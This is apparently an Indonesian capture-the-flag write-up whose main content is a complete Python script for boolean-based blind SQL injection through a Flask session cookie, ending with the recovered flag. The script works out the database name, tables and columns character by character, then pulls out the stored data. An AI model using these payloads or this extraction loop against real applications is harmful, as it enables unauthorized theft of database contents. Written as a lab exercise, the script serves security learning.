Flag yang berarti bendera, yang jelas bukan di makan tapi di Baca dan di lihat :D. Hint : Cek Request tersebut, kemudian dibandingkan dengan request sebelumnya

Link : http://103.157.96.13:7787/


Code
```
import requests

url = 'http://103.157.96.13:7787/'
karakter = 'CTFRabcdefghijklmnopqrstuvwxyz0123456789_{}?'

"""
request new Cookies
"""
def get_cookies():
	req = requests.get(url)
	res = req.cookies.get_dict()['Flask-Session-ID']
	return res



"""
Cari nama database
"""
def cari_dbname():
	# cari panjang db string
	panjang_db = 0
	dbname = ''

	print("[#] Mencari Panjang Database")
	for x in range(1,20):
		payload = f"' and (select length(database()))={x}#"
		co = get_cookies()+ f"{payload}"
		cookies = {'Flask-Session-ID' :  co }
		req = requests.get(url, cookies=cookies)
		res = req.text
		if 'CTFR' in res:
			panjang_db = x
			break
	print("[#] Ditemukan Panjang DB {}".format(str(panjang_db)))
	print("[#] Mencari Nama Database")

	for x in range(1,(panjang_db + 1)):
		for c in karakter:
			ch = ord(c)
			payload = f"' and (select ascii(substring(database(), {x}, 1)))={ch}#"
			co = get_cookies()+ f"{payload}"
			cookies = {'Flask-Session-ID' :  co }
			req = requests.get(url, cookies=cookies)
			res = req.text
			if 'CTFR' in res:
				dbname+=c
				break
	print(f"[#] Database : {dbname}")


"""
cari nama tabel
"""

def cari_tblname():
	#cari jumlah table
	print("[#] Mencari Jumlah Table")
	jml_table = 0
	for x in range(1,10):
		payload = f"' and (select count(*) from information_schema.tables WHERE table_schema=database())={x}#"
		co = get_cookies()+ f"{payload}"
		cookies = {'Flask-Session-ID' :  co }
		req = requests.get(url, cookies=cookies)
		res = req.text
		if 'CTFR' in res:
			jml_table=x
			break

	print(f"[#] Jumlah Table : {jml_table}")

	#cari nama tabel
	panjang_nm_table = []
	for i in range(0, jml_table):
		# cek panjang table ke i
		print(f"[#] Mencari panjang Table Ke : {i+1}")
		for j in range(1,10):
			payload = f"' and (select length(table_name) from information_schema.tables where table_schema=database() LIMIT {i},1)={j}#"
			co = get_cookies()+ f"{payload}"
			cookies = {'Flask-Session-ID' :  co }
			req = requests.get(url, cookies=cookies)
			res = req.text
			if 'CTFR' in res:
				panjang_nm_table.append(j)
				print(f"[#] Panjang Table Ke : {i+1} = {j}")
				break
	# Cari nama Tabel
	final_table = []
	for n in range(len(panjang_nm_table)):
		print(f"[#] Mencari table ke : {n + 1}")
		tbl = ''
		for num in range(1, (panjang_nm_table[n] + 1)):
			for c in karakter:
				ch = ord(c)
				payload = f"' and (select ascii(substr(table_name,{num},1)) from information_schema.tables where table_schema=database() limit {n},1) = {ch}#"
				co = get_cookies()+ f"{payload}"
				cookies = {'Flask-Session-ID' :  co }
				req = requests.get(url, cookies=cookies)
				res = req.text
				if 'CTFR' in res:
					tbl+=c
					break
		final_table.append(tbl)
		print(f"[#] Table ke : {n + 1} = {tbl}")
	return final_table

"""
cari kolom
1.data
2.session
"""

def cari_kolom():
	table = ['data','session']
	# cari jumlah kolom
	for t in table:
		print(f"[#] Mencari Jumlah Kolom pada table {t}")
		for jml in range(1, 10):
			payload=f"' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='{t}')={jml}#"
			co = get_cookies()+ f"{payload}"
			cookies = {'Flask-Session-ID' :  co }
			req = requests.get(url, cookies=cookies)
			res = req.text
			if 'CTFR' in res:
				print(f"[#] jumlah kolom table {t} = {jml}")
				for k in range(jml):
					print(f"[#] Mencari panjang kolom ke {k+1} table {t}")
					for p in range(1,10):
						payload = f"' and (select length(column_name) from information_schema.columns where table_schema=database() and table_name='{t}' limit {k},1)={p}#"
						co = get_cookies()+ f"{payload}"
						cookies = {'Flask-Session-ID' :  co }
						req = requests.get(url, cookies=cookies)
						res = req.text
						if 'CTFR' in res:
							print(f"[#] panjang kolom ke {k+1} table {t} = {p}")
							print(f"[#] Mencari nama kolom ke : {k + 1}")
							final_kolom = []
							for z in range(1,(p+1)):
								nm_kolom = ''
								for c in karakter:
									ch = ord(c)
									payload = f"' and (select ascii(substr(column_name,{z},1)) from information_schema.columns where table_schema=database() and table_name='{t}' limit {k},1) = {ch}#"
									co = get_cookies()+ f"{payload}"
									cookies = {'Flask-Session-ID' :  co }
									req = requests.get(url, cookies=cookies)
									res = req.text
									if 'CTFR' in res:
										nm_kolom+=c
										break
								final_kolom.append(nm_kolom)
							final_kolom = ''.join(final_kolom)
							print(f"[#] Kolom table {t} {final_kolom}")
							break
				break


"""
cari Content Flag
table = data
kolom = text
"""

def cari_flag(t,c):
	# cari jumlah record di tabel data
	for i in range(1,10):
		payload = f"' and (select count(*) from {t})={i}#"
		co = get_cookies()+ f"{payload}"
		cookies = {'Flask-Session-ID' :  co }
		req = requests.get(url, cookies=cookies)
		res = req.text
		if 'CTFR' in res:
			print(f"[+] Jumlah data di table {t} : {i}")
			for j in range(0,i):
				print(f"Mencari panjang data ke {j}")
				for k in range(100):
					payload = f"' and (select length({c}) from data limit 1)={k}#"
					co = get_cookies()+ f"{payload}"
					cookies = {'Flask-Session-ID' :  co }
					req = requests.get(url, cookies=cookies)
					res = req.text
					if 'CTFR' in res:
						print(f"[+] Panjang Data : {k}")
						print("[+] Mengambil data")
						d = ''
						for jk in range(1,(k + 1)):
							for cx in karakter:
								ch = ord(cx)
								payload = f"' and (select ascii(substr({c}, {jk}, 1)) from {t} limit 1)={ch}#"
								co = get_cookies()+ f"{payload}"
								cookies = {'Flask-Session-ID' :  co }
								req = requests.get(url, cookies=cookies)
								res = req.text
								if 'CTFR' in res:
									d+=cx
									print(f"[!] Flag : {d}")
									break
						break

			break

cari_dbname()		
cari_tblname()
cari_kolom()
cari_flag('data','text')
```

```
CTFR{n0w_y0u_l34rn1n9_h0w_t0_bl1nd_5ql_1nj3ct10n}
```